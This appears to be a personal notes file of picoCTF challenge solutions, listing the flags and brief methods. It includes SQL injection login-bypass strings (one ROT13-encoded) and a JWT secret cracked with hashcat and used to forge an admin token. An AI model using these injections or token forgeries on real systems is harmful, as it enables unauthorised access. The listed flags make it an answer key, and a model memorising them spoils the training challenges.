1. shark on wire 1 -> picoCTF{StaT31355_636f6e6e}
2. shark on wire 2 -> picoCTF{p1LLf3r3d_data_v1a_st3g0}
   1. picoiafda6f6e
   2. kfdsalkfsalkico{N0t_a_fLag}
   3. icoCTF{StaT31355e_
   4. picoCTF{StaT31355e_fda6f6e}
   5. picoCTF{StaT31355e_36}
   6. _
   7. 36
   8. }
   9. picoCTF{p1LLf3r3d_data_v1a_st3g0}

3. 1_wanna_b3_a_r0ck5tar ->   picoCTF{BONJOVI}
   1. mlitjssbs

4. like1000 -> picoCTF{l0t5_0f_TAR5}
5. Irish-Name-Repo 1 -> picoCTF{s0m3_SQL_85832275}
   </b>:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:18
   Stack trace:
   #0 {main}
   thrown in <b>/var/www/html/login.php</b>z

   1. username=admin' OR'1'='1&password=password123&debug=0
   2. Your flag is: picoCTF{s0m3_SQL_85832275}

6. vault-door-1 -> picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_7ffa94}
7. vault-door-3 -> picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_e60bc2}
8. vault-door-4 -> picoCTF{jU5t_4_bUnCh_0f_bYt3s_e021387213}
9. vault-door-5 -> picoCTF{c0nv3rt1ng_fr0m_ba5e_64_4185551e}
   1.  JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVmJTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2JTM0JTVmJTM0JTMxJTM4JTM1JTM1JTM1JTMxJTY1
   2.  from base64: %63%30%6e%76%33%72%74%31%6e%67%5f%66%72%30%6d%5f%62%61%35%65%5f%36%34%5f%34%31%38%35%35%35%31%65
   3. URL decode:  c0nv3rt1ng_fr0m_ba5e_64_4185551e

10. vault-door-6 -> picoCTF{n0t_mUcH_h4rD3r_tH4n_x0r_faae8b4}

01010101 -> 0x55
00111011 -> 0x3b
--------
01101110 -> n

11. Client-side-again -> picoCTF{not_this_again_4daf93}
12. Irish-Name-Repo 2 -> picoCTF{m0R3_SQL_plz_8c334129}
    1.  username=admin' OR'1'='1&password=password123&debug=0 -> not working
    2.  username=admin'--&password=anything&debug=0

13. Irish-Name-Repo 3 -> picoCTF{3v3n_m0r3_SQL_2af58a67} 
    1. SQL injection but ROT 13 the injection since it gets changed before read by SQL:   
       1. password=' BE 1=1--&debug=1   because BE = OR with ROT13

14. c0rrupt -> picoCTF{c0rrupt10n_1847995}
15. WhitePages -> picoCTF{not_all_spaces_are_created_equal_983fa43f23feeae01adc4cbf26e51fc5}
```bash
#!/usr/bin/env bash

python3 - <<'PY'
from pathlib import Path

data = Path("whitepages.txt").read_text(encoding="utf-8")

bits = data.replace("\u2003", "0").replace(" ", "1")

print(bits)
PY
```

16. flag_shop -> picoCTF{m0n3y_bag5_44cFf530}
17. Easy1 -> picoCTF{CRYPTOISFUN}
    1.  SU = C
    2.  OF = R
    3.  LJ = Y
    4.  VK = P
    5.  EX = T
    6.  CQ = O
    7.  RZ = I
    8.  YQ = S
    9.  PU = F
    10. TN = U
    11. OB = N
    12. CRYPTOISFUN

18. Mr-Worldwide -> picoCTF{KODIAK_ALASKA}
    1. 35.028309, 135.753082 = Kyoto, Japan
    2. 46.469391, 30.740883 = Odessa, Ukraine 
    3. 39.758949, -84.191605 = Dayton, USA
    4. 41.015137, 28.979530 = Istanbul, Turkey
    5. 24.466667, 54.366669 = Abu Dhabi, UAE
    6. 3.140853, 101.693207 = Kuala Lumput, Malaysia
    7. _
    8. 9.005401, 38.763611 = Addos Ababa, Ethiopia
    9. -3.989038, -79.203560 = Loja, Ecuador
    10. 52.377956, 4.897070 = Amsterdam, Netherlands
    11. 41.085651, -73.858467 = Sleepy Hollow, USA
    12. 57.790001, -152.407227 = Kodiak, Alaska, USA
    13. 31.205753, 29.924526 = ALexandria, Egypt
        1.  picoCTF{KODIADKL_AALASHKA}
        2.  picoCTF{JUUTUM_EENUUE}
        3.  picoCTF{KODIAK_ALASKA}

19. waves over lambda -> frequency_is_c_over_lambda_b613e7dd
    1. https://www.guballa.de/substitution-solver

20. Based -> picoCTF{learning_about_converting_values_aa2bA794}
21. Flags -> PICOCTF{F1AG5AND5TUFF}
    1.  picoCTF{f?ag?and?tuff}
    2.  picoCTF{f200ag100and100tuff}
    3.  picoCTF{flag_and_tuff}
    4.  picoCTF{flag_and_stuff}
    5.  picoCTF{flag_andstuff}
    6.  picoCTF{fsagmandmtuff}
    7.  PICOCTF{F1AG_AND_5TUFF}
    8.  PICOCTF{F1AG5AND5TUFF}

22. m00nwalk -> picoCTF{beep_boop_im_in_space}
    - git clone https://github.com/colaclanth/sstv.git
    - cd sstv
    - python3 -m venv venv
    - source venv/bin/activate
    - pip install -U pip
    - pip install .
    - sstv -d ~/Documents/git_hub/ctf/cylabacademy/challenge-lib/medium/message.wav \
    - picoCTF{beep_boop_im_in_space}

23. JaWT Scratchpad ->
    - eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
  
    - Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
        {
          "typ": "JWT",
          "alg": "HS256"
        }

    - Payload: eyJ1c2VyIjoiam9obiJ9 
        {
          "user": "john"
        }

    - Signature: _fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
        this is the result of: 
            HMACSHA256( Base64Url(header) + "." + Base64Url(payload), secret )
            then combined with a secret to form: _fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y

jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.WZ4kQqx55FHtBkGrN6lwtYR-_F9ANbgQUKRCAPIf_7Q;
Path=/

- hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y:ilovepico

- JWT with ilovepico:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.AMuH3A1TJcRUktdMkvEvVsbSJKJyf5oRglFMVGZuXz0

Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
- picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

-------------------------------------
first cookie:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y

Header: 
{
  : "JWT",
  : "HS256"
}
Payload:
{
  "user": "john"
}
Secret/Signature: 
ilovepico



add "admin" as user payload value together with "ilovepico" and convert to jwt token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

send with GET in burp:
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

23. Tapping -> 
.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ---.. .- .- -.... ..--- -.. -.-. .- }
PICOCTF{M0RS3C0D31SFUN8AA62DCA}
--------------------
24. 